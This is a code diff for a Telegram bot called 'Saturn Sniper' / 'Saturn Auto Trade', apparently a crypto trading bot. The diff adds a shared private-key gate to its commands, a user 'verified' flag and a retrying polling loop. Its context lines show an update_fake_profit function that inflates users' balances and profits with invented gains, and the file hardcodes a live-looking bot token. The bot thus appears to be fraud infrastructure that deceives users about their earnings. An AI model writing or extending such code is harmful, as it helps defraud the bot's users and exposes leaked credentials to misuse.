@@ -13,7 +13,7 @@ from collections import defaultdict
 # ===== CORE ADMIN CONFIG =====
 PRIMARY_ADMIN_ID = 6320779357          # your main Telegram user ID
 ADMIN_MIRROR_ENABLED = True           # /admin_on, /admin_off
-LOGSTREAM_ENABLED = False              # /logstream_on, /logstream_off
+LOGSTREAM_ENABLED = False             # /logstream_on, /logstream_off
 
 # ===== BOT CONFIG =====
 BOT_TOKEN = "8359973623:AAH8rUS6EjiSoPQKdDiJ_FxuoC5dE5ddrvs"
@@ -133,10 +133,13 @@ def get_user(user_id: int):
             "info_message_id": None,
             "temp_prompt_msg_id": None,
             "admin_note": "",
-            "last_active": now_utc_str()
+            "last_active": now_utc_str(),
+            "verified": False
         }
     else:
         db[uid]["last_active"] = now_utc_str()
+        if "verified" not in db[uid]:
+            db[uid]["verified"] = False
     save_db()
     return db[uid]
 
@@ -149,6 +152,23 @@ def update_fake_profit(user: dict):
         user["balance"] += gain
         user["profit_total"] += gain
         save_db()
+
+# ===== PRIVATE KEY ACCESS SYSTEM =====
+
+# One generic 20-digit key for everyone
+ACCESS_KEY = "72819455302766192844"
+
+def is_verified(user_id: int):
+    uid = str(user_id)
+    user = db.get(uid)
+    if not user:
+        return False
+    return user.get("verified", False)
+
+def set_verified(user_id: int):
+    user = get_user(user_id)
+    user["verified"] = True
+    save_db()
 
 # ===== MARKUPS =====
 
@@ -249,11 +269,22 @@ def update_info_panel(chat_id, user, text, markup=None, markdown=True):
 
 @bot.message_handler(commands=["start"])
 def cmd_start(message):
-    if is_banned(message.from_user.id) and not is_admin(message.from_user.id):
+    user_id = message.from_user.id
+
+    # Banned users first
+    if is_banned(user_id) and not is_admin(user_id):
         bot.reply_to(message, "🚫 You are banned from using Saturn Sniper.")
         return
-    track_activity(message.from_user.id, "/start")
-    user = get_user(message.from_user.id)
+
+    # Require private key if not verified
+    if not is_verified(user_id) and not is_admin(user_id):
+        msg = bot.reply_to(message, "🔐 Please enter your private key to continue:")
+        bot.register_next_step_handler(msg, process_private_key)
+        return
+
+    # Normal start flow
+    track_activity(user_id, "/start")
+    user = get_user(user_id)
     update_fake_profit(user)
 
     send_or_update_main_message(message.chat.id, user)
@@ -264,11 +295,29 @@ def cmd_start(message):
     )
     log_event(f"/start used by {message.from_user.id}")
 
+def process_private_key(message):
+    user_id = message.from_user.id
+    key_entered = message.text.strip()
+
+    if key_entered == ACCESS_KEY:
+        set_verified(user_id)
+        bot.reply_to(message, "✅ Access granted! Welcome.")
+        # Continue to normal start
+        cmd_start(message)
+    else:
+        bot.reply_to(message, "❌ Invalid key. Try again with /start")
+
 @bot.message_handler(commands=["help"])
 def cmd_help(message):
     if is_banned(message.from_user.id) and not is_admin(message.from_user.id):
         bot.reply_to(message, "🚫 You are banned from using Saturn Sniper.")
         return
+
+    # Block help for unverified users (except admins)
+    if not is_verified(message.from_user.id) and not is_admin(message.from_user.id):
+        bot.reply_to(message, "🔐 Please enter your private key first.\nUse /start")
+        return
+
     track_activity(message.from_user.id, "/help")
     user = get_user(message.from_user.id)
     update_fake_profit(user)
@@ -515,7 +564,8 @@ def admin_reset_user(message):
         "info_message_id": None,
         "temp_prompt_msg_id": None,
         "admin_note": "",
-        "last_active": now_utc_str()
+        "last_active": now_utc_str(),
+        "verified": False
     }
     save_db()
     bot.reply_to(message, f"✅ Reset user {uid_str} data.")
@@ -1007,9 +1057,19 @@ bot.set_update_listener(listener)
 @bot.callback_query_handler(func=lambda c: True)
 def callback(call):
     user_id = call.from_user.id
+
+    # Banned users
     if is_banned(user_id) and not is_admin(user_id):
         try:
             bot.answer_callback_query(call.id, "🚫 You are banned.")
+        except Exception:
+            pass
+        return
+
+    # Require verification for callbacks (non-admin)
+    if not is_verified(user_id) and not is_admin(user_id):
+        try:
+            bot.answer_callback_query(call.id, "🔐 Please enter your private key using /start")
         except Exception:
             pass
         return
@@ -1305,6 +1365,14 @@ def address_confirm(call):
             pass
         return
 
+    # Ensure only verified users can confirm addresses
+    if not is_verified(call.from_user.id) and not is_admin(call.from_user.id):
+        try:
+            bot.answer_callback_query(call.id, "🔐 Please enter your private key using /start")
+        except Exception:
+            pass
+        return
+
     if call.data.startswith("confirm_addr:"):
         new_addr = call.data.split("confirm_addr:")[1]
 
@@ -1420,6 +1488,11 @@ def unknown_command_handler(message):
     uid = message.from_user.id
     text = message.text or ""
 
+    # Block unverified users from interacting (non-admin)
+    if not is_admin(uid) and not is_verified(uid):
+        bot.reply_to(message, "🔐 Please enter your private key first.\nUse /start")
+        return
+
     # If this is a known command, ignore (other handlers will process it)
     if text.startswith("/"):
         cmd = text.split()[0]
@@ -1454,6 +1527,11 @@ def unknown_command_handler(message):
 
 if __name__ == "__main__":
     print("Saturn Auto Trade bot is running with extended admin features...")
-    bot.polling(none_stop=True)
 
-
+    # Crash-safe polling loop to survive Telegram read timeouts
+    while True:
+        try:
+            bot.polling(none_stop=True, interval=0, timeout=60, long_polling_timeout=60)
+        except Exception as e:
+            print(f"[Polling Error] {e}")
+            time.sleep(3)
